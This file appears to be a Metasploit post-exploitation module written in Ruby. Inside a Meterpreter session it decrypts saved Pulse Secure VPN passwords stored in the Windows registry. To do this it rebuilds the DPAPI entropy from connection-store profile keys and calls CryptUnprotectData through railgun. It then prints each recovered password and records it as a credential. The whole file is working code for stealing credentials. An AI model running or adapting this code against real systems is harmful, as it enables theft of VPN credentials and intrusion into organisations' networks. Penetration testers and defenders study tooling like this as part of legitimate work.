##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Windows Gather Pulse Secure VPN Saved Password Extraction",
      'Description'     => %q{
        This module extracts and decrypts saved Pulse Secure VPN passwords from the
        Windows Registry. This module can only access credentials created by the user the
        process is running as.
        It cannot link the password to a username because username is saved in
        'C:\ProgramData\Pulse Secure\ConnectionStore\[SID].dat', which is only readable
        by SYSTEM.
        Note that for enterprise deployment, this username is almost always the domain
        username.
      },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Quentin Kaiser <quentin@gremwell.com>']
    ))

  end

  def decrypt_reg(data, entropy)
    # decrypt value using CryptUnprotectData
    rg = session.railgun
    pid = session.sys.process.getpid
    process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)

    # write entropy to memory
    emem = process.memory.allocate(128)
    process.memory.write(emem, entropy)
    # write encrypted data to memory
    mem = process.memory.allocate(128)
    process.memory.write(mem, data)

    if session.sys.process.each_process.find { |i| i["pid"] == pid} ["arch"] == "x86"
        addr = [mem].pack("V")
        len = [data.length].pack("V")

        eaddr = [emem].pack("V")
        elen = [entropy.length].pack("V")

        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
        len, addr = ret["pDataOut"].unpack("V2")
    else
        # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
        addr = Rex::Text.pack_int64le(mem)
        len = Rex::Text.pack_int64le(data.length)

        eaddr = Rex::Text.pack_int64le(emem)
        elen = Rex::Text.pack_int64le(entropy.length)

        ret = rg.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
        pData = ret["pDataOut"].unpack("VVVV")
        len = pData[0] + (pData[1] << 32)
        addr = pData[2] + (pData[3] << 32)
    end
    return "" if len == 0
    return process.memory.read(addr, len)
  end

  def get_version
    begin
      version_path = "C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini"
      version_data = session.fs.file.open(version_path).read.to_s
      matches = version_data.scan(/DisplayVersion=([0-9\.]*)/m)
      return Gem::Version.new(matches[0][0])
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
  end

  def get_ives
    # parse connection profiles from Pulse Secure connection store and returns them
    # in a dict, indexed by connection identifier.
    begin
      connstore_path = "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.dat"
      connstore_data = session.fs.file.open(connstore_path).read.to_s
      ives = {}
      matches = connstore_data.scan(/ive "([a-z0-9]*)" {.*?connection-source: "([^"]*)".*?friendly-name: "([^"]*)".*?uri: "([^"]*)".*?}/m)
      matches.each do |m|
        ives[m[0]] = {}
        ives[m[0]]["connection-source"] = m[1]
        ives[m[0]]["friendly-name"] = m[2]
        ives[m[0]]["uri"] = m[3]
      end
      return ives
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
  end

  def get_entropy(value)
    # we generate the CryptUnprotect entropy value from IVE key
    seed = "IVE:#{value.upcase}"
    seed_utf16 = []
    seed.each_char do |c|
      seed_utf16 << c.ord
      seed_utf16 << 0
    end
    return seed_utf16.pack("c*")
  end

  def get_creds
    print_status "Checking for Pulse Secure IVE profiles in the registry"
    # we get local user profiles
    profiles = grab_user_profiles()
    creds = []
    # we get connection ives
    ives = get_ives

    # for each user profile, we check for potential connection ive
    profiles.each do |profile|
      keys = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
      if keys
        ives.each do |key, value|
          reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{key}"
          entropy = get_entropy(key)
          # We get the encrypted password value from registry
          vals = registry_enumvals(reg_path, "")
          if vals
            vals.each do |val|
              data = registry_getvaldata(reg_path, val)
              decrypted = decrypt_reg(data, entropy)
              if decrypted != ""
                ives[key]['username'] = nil
                ives[key]['password'] = decrypted.remove("\x00")
                creds << ives[key]
              end
            end
          end
        end
      end
    end
    return creds
  end

  def run
    version = get_version
    if version >= Gem::Version.new('9.1.4')
      print_status("Target is running Pulse Secure Connect version #{version}. Not affected.")
    else
      print_status("Target is running Pulse Secure Connect version #{version}. Affected.")
      creds = get_creds
      if creds.any?
        creds.each do |cred|
          print_good("Account Found:")
          print_status("     Username: #{cred['username']}")
          print_status("     Password: #{cred['password']}")
          print_status("     URI: #{cred['uri']}")
          print_status("     Name: #{cred['friendly-name']}")
          print_status("     Source: #{cred['connection-source']}")

          uri = URI(cred['uri'])
          service_data = {
            address: Rex::Socket.getaddress(uri.host),
            port: uri.port,
            protocol: "tcp",
            realm_key: Metasploit::Model::Realm::Key::WILDCARD,
            realm_value: uri.path,
            service_name: "Pulse Secure SSL VPN",
            workspace_id: myworkspace_id
          }

          credential_data = {
            origin_type: :session,
            session_id: session_db_id,
            post_reference_name: self.refname,
            username: nil,
            private_data: cred['password'],
            private_type: :password
          }

          credential_core = create_credential(credential_data.merge(service_data))

          login_data = {
            core: credential_core,
            access_level: "User",
            status: Metasploit::Model::Login::Status::UNTRIED
          }

          create_credential_login(login_data.merge(service_data))
        end
      else
        print_error "No users with configs found. Exiting"
      end
    end
  end
end
